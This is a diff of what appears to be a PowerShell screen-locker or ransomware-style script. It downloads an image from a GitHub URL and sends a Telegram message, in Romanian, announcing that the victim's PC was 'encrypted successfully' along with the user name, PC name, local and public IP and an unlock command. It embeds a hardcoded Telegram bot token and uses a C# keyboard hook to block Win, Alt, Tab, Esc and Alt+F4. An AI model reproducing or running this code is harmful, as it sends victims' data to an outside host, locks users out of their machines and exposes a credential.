@@ -1,3 +1,4 @@
+# SETTINGS
 $imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
 $tempImagePath = "$env:TEMP\image.jpg"
 $botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
@@ -19,7 +20,7 @@ function Send-Telegram-Message {
 
     try { $ipPublic = (Invoke-RestMethod "https://api.ipify.org") } catch { $ipPublic = "n/a" }
 
-    $message = "PC-ul $user ($pc) a fost criptat cu succes.nIP: $ipLocal | $ipPublicnnUnlock it: $unlockCommand"
+    $message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic`n`nUnlock it: $unlockCommand"
     $body = @{ chat_id = $chatID; text = $message } | ConvertTo-Json -Compress
     Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
 }
@@ -68,15 +69,14 @@ public class KeyBlocker {
 
             if (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN) {
                 if (vkCode == 0x43) Environment.Exit(0); // C key closes app
-
                 if (vkCode == 0x12) altPressed = true; // ALT pressed
 
-                // Explicitly block Alt+F4
-                if (altPressed && vkCode == 0x73)
+                // Block Win keys, ALT, Tab, Esc
+                if (vkCode == 0x09 || vkCode == 0x1B || vkCode == 0x5B || vkCode == 0x5C || vkCode == 0x12)
                     return (IntPtr)1;
 
-                // Block Windows keys, ALT, Tab, Esc individually
-                if (vkCode == 0x09 || vkCode == 0x1B || vkCode == 0x5B || vkCode == 0x5C || vkCode == 0x12)
+                // Specifically block ALT+F4
+                if (altPressed && vkCode == 0x73)
                     return (IntPtr)1;
             }
 
